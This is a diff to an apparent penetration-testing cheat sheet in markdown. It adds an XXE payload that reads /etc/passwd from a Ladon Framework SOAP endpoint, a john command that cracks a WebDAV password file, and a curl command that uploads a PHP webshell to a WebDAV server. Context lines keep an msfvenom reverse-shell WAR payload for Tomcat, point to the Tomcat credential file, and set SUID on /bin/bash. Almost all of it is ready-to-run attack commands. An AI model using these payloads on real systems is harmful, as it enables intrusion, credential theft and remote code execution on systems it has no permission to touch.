@@ -186,9 +186,6 @@ chmod +s /bin/bash
 > 1. **Here is the file in which creds are saved --->** ```/etc/tomcat[5,6,7,8,9]/tomcat-users.xml``` e.g ```/etc/tomcat7/tomcat-users.xml```
 > 1. Deploy this payload to tomcat and get reverse shell ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.100 LPORT=8080 -f war -o myrev.war```
 	
-
-
-	
 	
 #### XXE injection
 ```bash
@@ -201,7 +198,32 @@ chmod +s /bin/bash
 		<reward>&xxe;</reward>
 		</bugreport> 
 ```
-
+#### XXE injection Ladon Framework for Python 0.9.40 for via BurpSuite Proxy
+```bash
+curl -- proxy http://127.0.0.1:8080 -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://192.168.187.161:8888/muddy/soap11/checkout\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:muddy\"><soapenv:Header/>
+<soapenv:Body>
+<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&passwd;</uid>
+</urn:checkout>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://192.168.187.161:8888/muddy/soap11/checkout' | xmllint --format -	
+```
+#### Webdav
+> 1. Cracking webdav password ```bash john --wordlist=/usr/share/wordlists/rockyou.txt webdav.passwd```
+> 1. Webdav password location probably ```bash var/www/html/webdav/passwd.dav```
+> 1. Uploading PHP rce on WebDav via CURL ```curl -X PUT -u administrantor:password http://abc.com/webdav/myrce.php --data-binary @"/usr/share/webshells/php/codeexec.php"``` 
+	
 #### Scripts & Utilities
 > 1. Extract IP addresses out a file - ```bash sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}```
 
